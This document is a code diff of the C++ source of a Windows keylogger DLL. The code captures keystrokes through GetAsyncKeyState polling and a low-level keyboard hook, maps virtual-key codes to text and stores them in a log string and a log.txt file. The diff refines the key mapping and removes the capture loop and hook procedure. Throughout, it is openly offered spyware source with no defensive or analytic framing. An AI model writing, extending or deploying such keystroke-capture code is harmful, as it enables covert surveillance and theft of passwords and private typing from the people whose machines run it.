@@ -3,33 +3,7 @@
 #include "pch.h"
 #include "keylogger.hpp"
 
-//global key state flags
-bool shiftDown = false;
-bool capsToggled = false;
-bool numlockToggled = false;
-
-extern "C++" __declspec(dllexport) inline void InitFile() {
-	file.open("log.txt");
-}
-
-extern "C++" __declspec(dllexport) inline void CloseFile() {
-	file.close();
-}
-
-void SetGlobalKeyStates()
-{
-	shiftDown = true*(GetKeyState(VK_SHIFT) >> 15);
-	capsToggled = true*(GetKeyState(VK_CAPITAL) & 1);
-	numlockToggled = true*(GetKeyState(VK_NUMLOCK) & 1);
-	/*if (GetKeyState(VK_SHIFT) >> 15) shiftDown = true;
-	else shiftDown = false;
-	if (GetKeyState(VK_CAPITAL) & 1) capsToggled = true;
-	else capsToggled = false;
-	if (GetKeyState(VK_NUMLOCK) & 1) numlockToggled = true;
-	else numlockToggled = false;*/
-}
-
-void PrintSpecialKeys(const int& key, const bool& shiftState)
+void PrintSpecialKeys(const DWORD& key, const bool& shiftState)
 {
 	switch (key)
 	{
@@ -50,8 +24,20 @@ void PrintSpecialKeys(const int& key, const bool& shiftState)
 	case VK_SHIFT:
 		LogKeys("[SHIFT]");
 		break;
+	case VK_LSHIFT:
+		LogKeys("[SHIFT]");
+		break;
+	case VK_RSHIFT:
+		LogKeys("[SHIFT]");
+		break;
 	case VK_CONTROL:
-		LogKeys("[CONTROL]");
+		LogKeys("[CTRL]");
+		break;
+	case VK_LCONTROL:
+		LogKeys("[CTRL]");
+		break;
+	case VK_RCONTROL:
+		LogKeys("[CTRL]");
 		break;
 	case VK_BACK:
 		logStr.pop_back();
@@ -96,51 +82,45 @@ void PrintSpecialKeys(const int& key, const bool& shiftState)
 		LogKeys("[F12]");
 		break;
 	case VK_NUMPAD0:
-		LogKeys("[NUMPAD0]");
+		LogKeys("0");
 		break;
 	case VK_NUMPAD1:
-		LogKeys("[NUMPAD1]");
+		LogKeys("1");
 		break;
 	case VK_NUMPAD2:
-		LogKeys("[NUMPAD2]");
+		LogKeys("2");
 		break;
 	case VK_NUMPAD3:
-		LogKeys("[NUMPAD3]");
+		LogKeys("3");
 		break;
 	case VK_NUMPAD4:
-		LogKeys("[NUMPAD4]");
+		LogKeys("4");
 		break;
 	case VK_NUMPAD5:
-		LogKeys("[NUMPAD5]");
+		LogKeys("5");
 		break;
 	case VK_NUMPAD6:
-		LogKeys("[NUMPAD6]");
+		LogKeys("6");
 		break;
 	case VK_NUMPAD7:
-		LogKeys("[NUMPAD7]");
+		LogKeys("7");
 		break;
 	case VK_NUMPAD8:
-		LogKeys("[NUMPAD8]");
+		LogKeys("8");
 		break;
 	case VK_NUMPAD9:
-		LogKeys("[NUMPAD9]");
+		LogKeys("9");
 		break;
 	case VK_TAB:
 		LogKeys("[TAB]");
 		break;
-	case VK_UP:
-		LogKeys("[UP]");
-		break;
-	case VK_DOWN:
-		LogKeys("[DOWN]");
-		break;
-	case VK_LEFT:
-		LogKeys("[LEFT]");
-		break;
-	case VK_RIGHT:
-		LogKeys("[RIGHT]");
-		break;
 	case VK_MENU:
+		LogKeys("[ALT]");
+		break;
+	case VK_LMENU:
+		LogKeys("[ALT]");
+		break;
+	case VK_RMENU:
 		LogKeys("[ALT]");
 		break;
 	case VK_OEM_MINUS:
@@ -176,14 +156,14 @@ void PrintSpecialKeys(const int& key, const bool& shiftState)
 		else LogKeys("]");
 		break;
 	case VK_OEM_7:
-		if (shiftState) putchar('"');
+		if (shiftState) LogKeys('"');
 		else LogKeys("'");
 		break;
 	case VK_SNAPSHOT:
 		LogKeys("[PRNTSCR]");
 		return;
 	case VK_INSERT:
-		LogKeys("[TOGGLE INSERT]");
+		LogKeys("[INSERT]");
 		return;
 	case VK_HOME:
 		LogKeys("[HOME]");
@@ -195,7 +175,7 @@ void PrintSpecialKeys(const int& key, const bool& shiftState)
 		LogKeys("[PGDOWN]");
 		return;
 	case VK_DELETE:
-		LogKeys("[DELETE]");
+		LogKeys("[DEL]");
 		return;
 	case VK_END:
 		LogKeys("[END]");
@@ -219,7 +199,7 @@ void PrintSpecialKeys(const int& key, const bool& shiftState)
 		LogKeys("[RWIN]");
 		return;
 	case VK_SCROLL:
-		LogKeys("[TOGGLE SCRLK]");
+		LogKeys("[SCRLK]");
 		return;
 	case VK_ESCAPE:
 		LogKeys("[ESC]");
@@ -232,7 +212,7 @@ void PrintSpecialKeys(const int& key, const bool& shiftState)
 	}
 }
 
-void PrintDigits(const int& key, const bool& shiftState)
+void PrintDigits(const DWORD& key, const bool& shiftState)
 {
 	if (shiftState)
 	{
@@ -275,82 +255,31 @@ void PrintDigits(const int& key, const bool& shiftState)
 	LogDigit(key - 48);
 }
 
-void PrintAlpha(const int& key, const bool&& upper)
+void PrintAlpha(const DWORD& key, const bool&& upper)
 {
 	const int offset = 32 * !upper;
 	LogKeys(key + offset);
 }
 
-inline void LogKeys(const std::string_view&& str)
+void LogKeys(const std::string_view&& str)
 {
 	logStr += str;
 	sizeOfLogStr++;
 	//printf("%s", str.data());
 }
 
-inline void LogKeys(const int&& key)
+void LogKeys(const DWORD&& key)
 {
 	logStr += static_cast<char>(key);
 	sizeOfLogStr++;
 	//printf("%c", key);
 }
 
-inline void LogDigit(const int&& digit)
+void LogDigit(const DWORD&& digit)
 {
 	logStr  += std::to_string(digit);
 	sizeOfLogStr++;
 	//printf("%i", digit);
-}
-
-extern "C++" __declspec(dllexport) void StartLog()
-{
-	//main listening loop
-	while (true)
-	{
-		SetGlobalKeyStates();
-		for (int i = 8; i <= 0xDE; ++i)
-		{
-			if (GetAsyncKeyState(i) & 1)
-			{
-				if (i >= 'A' && i <= 'Z')
-				{
-					PrintAlpha(i, shiftDown ^ capsToggled);
-				}
-				else if (isdigit(i))
-				{
-					PrintDigits(i, shiftDown);
-				}
-				else
-				{
-					PrintSpecialKeys(i, shiftDown);
-				}
-			}
-		}
-		using namespace std::chrono_literals;
-		std::this_thread::sleep_for(20ms);
-	}
-}
-
-extern "C" LOGLIB_API LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
-{
-	const auto key = (LPKBDLLHOOKSTRUCT)lParam;
-	logStr += key->vkCode;
-	/*if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) 
-	{
-		if (key->vkCode >= 'A' && key->vkCode <= 'Z')
-		{
-			PrintAlpha(key->vkCode, shiftDown ^ capsToggled);
-		}
-		else if (isdigit(key->vkCode))
-		{
-			PrintDigits(key->vkCode, shiftDown);
-		}
-		else
-		{
-			PrintSpecialKeys(key->vkCode, shiftDown);
-		}
-	}*/
-	return CallNextHookEx(nullptr, nCode, wParam, lParam);
 }
 
 extern "C++" __declspec(dllexport) inline std::string GetLog() {
